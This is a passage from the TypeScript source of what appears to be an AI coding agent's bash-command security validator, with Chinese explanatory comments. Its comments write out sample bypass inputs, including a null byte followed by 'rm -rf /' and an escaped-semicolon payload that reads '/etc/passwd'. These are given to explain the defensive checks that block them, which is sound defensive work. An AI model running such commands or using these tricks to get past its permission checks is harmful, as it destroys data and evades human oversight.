        "Command uses 'fc -e' which can execute arbitrary commands via editor",
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No Zsh dangerous commands',
  }
}

// Matches non-printable control characters that have no legitimate use in shell
// commands: 0x00-0x08, 0x0B-0x0C, 0x0E-0x1F, 0x7F. Excludes tab (0x09),
// newline (0x0A), and carriage return (0x0D) which are handled by other
// validators. Bash silently drops null bytes and ignores most control chars,
// so an attacker can use them to slip metacharacters past our checks while
// bash still executes them (e.g., "echo safe\x00; rm -rf /").
// eslint-disable-next-line no-control-regex
// 不可见控制字符：bash 会**静默丢弃**它们，但我们的正则看得到。
//   于是 `echo safe\x00; rm -rf /` 在校验器眼里是奇怪的字符串，在 bash 眼里是两条命令
const CONTROL_CHAR_RE = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/

/**
 * @deprecated Legacy regex/shell-quote path. Only used when tree-sitter is
 * unavailable. The primary gate is parseForSecurity (ast.ts).
 */
/**
 * 【做什么】同步版主入口：跑完整的安全验证链
 * 【为什么需要】把「控制字符 → shell-quote bug → 剥 heredoc → 早验证器 → 主验证器链」串起来
 * 【入参】command：命令原文
 * 【返回】ask（发现风险）/ passthrough（通过，交给权限链后续环节）
 * 【关键步骤】
 *   ① 控制字符、shell-quote 单引号 bug：**最先**检查（它们会污染后面所有解析）
 *   ② 只剥离「引号 heredoc」的正文（未加引号的 heredoc 会做变量展开，必须留给验证器看）
 *   ③ 构造上下文（含三种去引号版本）
 *   ④ 早验证器：空命令 / 不完整片段 / 安全 heredoc / 简单 git commit —— 命中 allow 就直接返回 passthrough
 *   ⑤ 主验证器链：逐个跑，发现 ask 就处理（见下方关于「延迟非差异类结果」的说明）
 *   ⑥ 全部通过 → passthrough
 */
export function bashCommandIsSafe_DEPRECATED(
  command: string,
): PermissionResult {
  // SECURITY: Block control characters before any other processing. Null bytes
  // and other non-printable chars are silently dropped by bash but confuse our
  // validators, allowing metacharacters adjacent to them to slip through.
  if (CONTROL_CHAR_RE.test(command)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.CONTROL_CHARACTERS,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains non-printable control characters that could be used to bypass security checks',
      isBashSecurityCheckForMisparsing: true,
    }
  }

  // SECURITY: Detect '\' patterns that exploit shell-quote's incorrect handling
  // of backslashes inside single quotes. Must run before shell-quote parsing.
  if (hasShellQuoteSingleQuoteBug(command)) {
    return {
      behavior: 'ask',
      message:
        'Command contains single-quoted backslash pattern that could bypass security checks',
      isBashSecurityCheckForMisparsing: true,
    }
  }

  // SECURITY: Strip heredoc bodies before running security validators.
  // Only strip bodies for quoted/escaped delimiters (<<'EOF', <<\EOF) where
  // the body is literal text — $(), backticks, and ${} are NOT expanded.
  // Unquoted heredocs (<<EOF) undergo full shell expansion, so their bodies
  // may contain executable command substitutions that validators must see.
  // When extractHeredocs bails out (can't parse safely), the raw command
  // goes through all validators — which is the safe direction.
  const { processedCommand } = extractHeredocs(command, { quotedOnly: true })

  const baseCommand = command.split(' ')[0] || ''
  const { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars } =
    extractQuotedContent(processedCommand, baseCommand === 'jq')

  const context: ValidationContext = {
    originalCommand: command,
    baseCommand,
    unquotedContent: withDoubleQuotes,
    fullyUnquotedContent: stripSafeRedirections(fullyUnquoted),
    fullyUnquotedPreStrip: fullyUnquoted,
    unquotedKeepQuoteChars,
  }

  // 早验证器（early validators）：命中 allow 意味着「整条命令可证明安全」，会**跳过**后面所有验证器。
  //   正因为权力很大，它们的判定条件都写得极其保守，宁可 passthrough 交给完整链路
  const earlyValidators = [
    validateEmpty,
    validateIncompleteCommands,
    validateSafeCommandSubstitution,
    validateGitCommit,
  ]

  for (const validator of earlyValidators) {
    const result = validator(context)
    if (result.behavior === 'allow') {
      return {
        behavior: 'passthrough',
        message:
          result.decisionReason?.type === 'other' ||
          result.decisionReason?.type === 'safetyCheck'
            ? result.decisionReason.reason
            : 'Command allowed',
      }
    }
    if (result.behavior !== 'passthrough') {
      return result.behavior === 'ask'
        ? { ...result, isBashSecurityCheckForMisparsing: true as const }
        : result
    }
  }

  // Validators that don't set isBashSecurityCheckForMisparsing — their ask
  // results go through the standard permission flow rather than being blocked
  // early. LF newlines and redirections are normal patterns that splitCommand
  // handles correctly, not misparsing concerns.
  //
  // NOTE: validateCarriageReturn is NOT here — CR IS a misparsing concern.
  // shell-quote's `[^\s]` treats CR as a word separator (JS `\s` ⊃ \r), but
  // bash IFS does NOT include CR. splitCommand collapses CR→space, which IS
  // misparsing. See validateCarriageReturn for the full attack trace.
  const nonMisparsingValidators = new Set([
    validateNewlines,
    validateRedirections,
  ])

  const validators = [
    validateJqCommand,
    validateObfuscatedFlags,
    validateShellMetacharacters,
    validateDangerousVariables,
    // Run comment-quote-desync BEFORE validateNewlines: it detects cases where
    // the quote tracker would miss newlines due to # comment desync.
    validateCommentQuoteDesync,
    // Run quoted-newline BEFORE validateNewlines: it detects the INVERSE case
    // (newlines INSIDE quotes, which validateNewlines ignores by design). Quoted
    // newlines let attackers split commands across lines so that line-based
    // processing (stripCommentLines) drops sensitive content.
    validateQuotedNewline,
    // CR check runs BEFORE validateNewlines — CR is a MISPARSING concern
    // (shell-quote/bash tokenization differential), LF is not.
    validateCarriageReturn,
    validateNewlines,
    validateIFSInjection,
    validateProcEnvironAccess,
    validateDangerousPatterns,
    validateRedirections,
    validateBackslashEscapedWhitespace,
    validateBackslashEscapedOperators,
    validateUnicodeWhitespace,
    validateMidWordHash,
    validateBraceExpansion,
    validateZshDangerousCommands,
    // Run malformed token check last - other validators should catch specific patterns first
    // (e.g., $() substitution, backticks, etc.) since they have more precise error messages
    validateMalformedTokenInjection,
  ]

  // SECURITY: We must NOT short-circuit when a non-misparsing validator
  // 中文详解（一个很容易做错的地方）：
  //   验证器分两类——「解析器差异类」（要带 isBashSecurityCheckForMisparsing 直接拦）
  //   和「普通可疑类」（如重定向，走标准权限流程）。如果按顺序一遇到 ask 就返回，
  //   那么排在前面的普通类（重定向）会先返回、且不带标记，于是后面那个差异类（\;）根本没机会跑。
  //   攻击者就能用 `cat safe.txt \; echo /etc/passwd > ./out` 这类组合绕过。
  //   解决办法：普通类的 ask 先**存起来**，继续跑完所有验证器；
  //   只有确认没有差异类命中时，才把存起来的结果返回
  // returns 'ask' if there are still misparsing validators later in the list.
  // Non-misparsing ask results are discarded at bashPermissions.ts:~1301-1303
  // (the gate only blocks when isBashSecurityCheckForMisparsing is set). If
  // validateRedirections (index 10, non-misparsing) fires first on `>`, it
  // returns ask-without-flag — but validateBackslashEscapedOperators (index 12,
  // misparsing) would have caught `\;` WITH the flag. Short-circuiting lets a
  // payload like `cat safe.txt \; echo /etc/passwd > ./out` slip through.
  //
  // Fix: defer non-misparsing ask results. Continue running validators; if any
  // misparsing validator fires, return THAT (with the flag). Only if we reach
  // the end without a misparsing ask, return the deferred non-misparsing ask.
  let deferredNonMisparsingResult: PermissionResult | null = null
  for (const validator of validators) {
    const result = validator(context)
    if (result.behavior === 'ask') {
      if (nonMisparsingValidators.has(validator)) {
        if (deferredNonMisparsingResult === null) {
          deferredNonMisparsingResult = result
        }
        continue
      }
      return { ...result, isBashSecurityCheckForMisparsing: true as const }
    }
  }
  if (deferredNonMisparsingResult !== null) {
    return deferredNonMisparsingResult
  }

  return {
    behavior: 'passthrough',
    message: 'Command passed all security checks',
  }
}

/**
 * @deprecated Legacy regex/shell-quote path. Only used when tree-sitter is
 * unavailable. The primary gate is parseForSecurity (ast.ts).
 *
 * Async version of bashCommandIsSafe that uses tree-sitter when available
 * for more accurate parsing. Falls back to the sync regex version when
 * tree-sitter is not available.
 *
 * This should be used by async callers (bashPermissions.ts, bashCommandHelpers.ts).
 * Sync callers (readOnlyValidation.ts) should continue using bashCommandIsSafe().
 */
/**
 * 【做什么】异步版主入口：优先用 tree-sitter 的解析结果，没有则退回同步版
 * 【为什么需要】tree-sitter 是真正的 bash 语法解析器，比正则可靠得多；
 *   但它是异步的（要加载 wasm），所以同步调用方仍需要 bashCommandIsSafe_DEPRECATED
 * 【入参】command：命令原文；onDivergence：可选的回调，用于批量上报「两种解析结果不一致」
 * 【返回】同同步版
 * 【关键步骤】
 *   ① ParsedCommand.parse 取 tree-sitter 分析；拿不到就退回同步版
 *   ② 前面的控制字符 / shell-quote bug 检查与同步版完全一致（tree-sitter 帮不上忙）
 *   ③ 引号上下文改用 tree-sitter 的结果，同时保留正则结果用于比对
 *   ④ 比对不一致时上报埋点（有 heredoc 的命令跳过比对，因为两者本来就不可能一致）
 *   ⑤ 跑与同步版相同的验证器链
 */
export async function bashCommandIsSafeAsync_DEPRECATED(
  command: string,
  onDivergence?: () => void,
): Promise<PermissionResult> {
  // Try to get tree-sitter analysis
  const parsed = await ParsedCommand.parse(command)
  const tsAnalysis = parsed?.getTreeSitterAnalysis() ?? null

  // If no tree-sitter, fall back to sync version
  if (!tsAnalysis) {
    return bashCommandIsSafe_DEPRECATED(command)
  }

  // Run the same security checks but with tree-sitter enriched context.
  // The early checks (control chars, shell-quote bug) don't benefit from
  // tree-sitter, so we run them identically.
  if (CONTROL_CHAR_RE.test(command)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.CONTROL_CHARACTERS,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains non-printable control characters that could be used to bypass security checks',
      isBashSecurityCheckForMisparsing: true,
    }
  }

  if (hasShellQuoteSingleQuoteBug(command)) {
    return {
      behavior: 'ask',
      message:
        'Command contains single-quoted backslash pattern that could bypass security checks',
      isBashSecurityCheckForMisparsing: true,
    }
  }

  const { processedCommand } = extractHeredocs(command, { quotedOnly: true })

  const baseCommand = command.split(' ')[0] || ''

  // Use tree-sitter quote context for more accurate analysis
  const tsQuote = tsAnalysis.quoteContext
  const regexQuote = extractQuotedContent(
    processedCommand,
    baseCommand === 'jq',
  )

  // Use tree-sitter quote context as primary, but keep regex as reference
  // for divergence logging
  const withDoubleQuotes = tsQuote.withDoubleQuotes
  const fullyUnquoted = tsQuote.fullyUnquoted
  const unquotedKeepQuoteChars = tsQuote.unquotedKeepQuoteChars

  const context: ValidationContext = {
    originalCommand: command,
    baseCommand,
    unquotedContent: withDoubleQuotes,
    fullyUnquotedContent: stripSafeRedirections(fullyUnquoted),
    fullyUnquotedPreStrip: fullyUnquoted,
    unquotedKeepQuoteChars,
    treeSitter: tsAnalysis,
  }

  // Log divergence between tree-sitter and regex quote extraction.
  // Skip for heredoc commands: tree-sitter strips (quoted) heredoc bodies
  // to nothing while the regex path replaces them with placeholder strings
  // (via extractHeredocs), so the two outputs can never match. Logging
  // divergence for every heredoc command would poison the signal.
  //
  // onDivergence callback: when called in a fanout loop (bashPermissions.ts
  // Promise.all over subcommands), the caller batches divergences into a
  // single logEvent instead of N separate calls. Each logEvent triggers
  // getEventMetadata() → buildProcessMetrics() → process.memoryUsage() →
  // /proc/self/stat read; with memoized metadata these resolve as microtasks
  // and starve the event loop (CC-643). Single-command callers omit the
  // callback and get the original per-call logEvent behavior.
  if (!tsAnalysis.dangerousPatterns.hasHeredoc) {
    const hasDivergence =
      tsQuote.fullyUnquoted !== regexQuote.fullyUnquoted ||
      tsQuote.withDoubleQuotes !== regexQuote.withDoubleQuotes
    if (hasDivergence) {
      // 为什么用回调而不是直接 logEvent：在权限链里会对每个子命令并发调用本函数，
      //   若每个都单独上报，会触发大量 getEventMetadata()（含读 /proc/self/stat），
      //   微任务堆积把事件循环饿死（真实的性能事故）。交给调用方批量上报即可
      if (onDivergence) {
        onDivergence()
      } else {
        logEvent('tengu_tree_sitter_security_divergence', {
          quoteContextDivergence: true,
        })
      }
    }
  }

  const earlyValidators = [
    validateEmpty,
    validateIncompleteCommands,
    validateSafeCommandSubstitution,
    validateGitCommit,
  ]

  for (const validator of earlyValidators) {
    const result = validator(context)
    if (result.behavior === 'allow') {
      return {
        behavior: 'passthrough',
        message:
          result.decisionReason?.type === 'other' ||
          result.decisionReason?.type === 'safetyCheck'
            ? result.decisionReason.reason
            : 'Command allowed',
      }
    }
    if (result.behavior !== 'passthrough') {
      return result.behavior === 'ask'
        ? { ...result, isBashSecurityCheckForMisparsing: true as const }
        : result
    }
  }

  const nonMisparsingValidators = new Set([
    validateNewlines,
    validateRedirections,
  ])

  const validators = [
    validateJqCommand,
    validateObfuscatedFlags,
    validateShellMetacharacters,
    validateDangerousVariables,
    validateCommentQuoteDesync,
    validateQuotedNewline,
    validateCarriageReturn,
    validateNewlines,
    validateIFSInjection,
    validateProcEnvironAccess,
    validateDangerousPatterns,
    validateRedirections,
    validateBackslashEscapedWhitespace,
    validateBackslashEscapedOperators,
    validateUnicodeWhitespace,
    validateMidWordHash,
    validateBraceExpansion,
    validateZshDangerousCommands,
    validateMalformedTokenInjection,
  ]

  let deferredNonMisparsingResult: PermissionResult | null = null
  for (const validator of validators) {
    const result = validator(context)
    if (result.behavior === 'ask') {
      if (nonMisparsingValidators.has(validator)) {
        if (deferredNonMisparsingResult === null) {
          deferredNonMisparsingResult = result
        }
        continue
      }
      return { ...result, isBashSecurityCheckForMisparsing: true as const }
    }
  }
  if (deferredNonMisparsingResult !== null) {
    return deferredNonMisparsingResult
  }

  return {
    behavior: 'passthrough',
    message: 'Command passed all security checks',
  }
}
